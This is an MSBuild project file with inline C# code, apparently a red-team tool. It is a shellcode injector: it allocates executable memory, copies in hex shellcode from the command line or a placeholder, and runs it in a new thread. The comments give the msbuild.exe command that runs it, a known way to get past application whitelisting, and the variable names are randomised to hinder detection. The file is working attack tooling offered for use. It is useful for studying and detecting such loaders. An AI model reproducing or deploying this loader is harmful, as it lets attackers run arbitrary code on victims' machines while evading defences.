<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes C# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe ShellCodeInjector.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Evan Pena, Twitter: @evan_pena2003 -->
  <Target Name="ShellCodeInjector">
   <FragmentExample />
  </Target>
  <UsingTask
    TaskName="FragmentExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <ParameterGroup/>
    <Task>	
      <Code Type="Class" Language="cs">
        <![CDATA[
            using System;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;			
            using System.Net;
            using System.Net.Sockets;
            using System.Runtime.InteropServices;
            using System.Text;
            using System.IO;
                
            public class FragmentExample :  Task, ITask
            {
                public override bool Execute()
                {					
                    string[] args = Environment.GetCommandLineArgs();
                    ShellCodeInject.Main(args);
                    return true;
                }
            }
            
            public class ShellCodeInject
            {
                [DllImport("kernel32")]
                private static extern IntPtr VirtualAlloc(UInt32 JWmoIlFhPkGN, UInt32 UzWUXeiqddon, UInt32 szYzablY, UInt32 GXqpQXZYHpUiQ);
                [DllImport("kernel32")]
                private static extern IntPtr CreateThread(UInt32 cfYPJVtsoTj, UInt32 BzaNozPQLx, IntPtr YcjYxbv, IntPtr FmjdKEI, UInt32 WalIOQWiqTD, ref UInt32 VmRrcdmoX);
                [DllImport("kernel32")]
                private static extern UInt32 WaitForSingleObject(IntPtr xGtvlmms, UInt32 TgXuJhLpycZ);

                public static void Main(string[] args)
                {										
                    // Check if shellcode is passed as an argument
                    string strShellCode = args.Length > 2 ? args[2] : "YOURSHELLCODE"; // Default shellcode here

                    // Convert shellcode input string into byte array
                    IntPtr ITGMyKKAUUm = VirtualAlloc(0,(UInt32)(strShellCode.Length / 2), 0x1000, 0x40);
                    byte[] shellcode = StringToByteArray(strShellCode);					

                    Marshal.Copy(shellcode, 0, ITGMyKKAUUm, shellcode.Length);
                    IntPtr DYtvdEXCykZ = IntPtr.Zero; UInt32 UgAJRevmsLwnO = 0; IntPtr qhaCJWwoK = IntPtr.Zero;
                    DYtvdEXCykZ = CreateThread(0, 0, ITGMyKKAUUm, qhaCJWwoK, 0, ref UgAJRevmsLwnO);
                    WaitForSingleObject(DYtvdEXCykZ, 0xFFFFFFFF);
                }
                
                public static byte[] StringToByteArray(String hex)
                {
                    int NumberChars = hex.Length;
                    byte[] bytes = new byte[NumberChars / 2];
                    for (int i = 0; i < NumberChars; i += 2)
                        bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
                    return bytes;
                }
            }
        ]]>
      </Code>
    </Task>
    </UsingTask>
</Project>
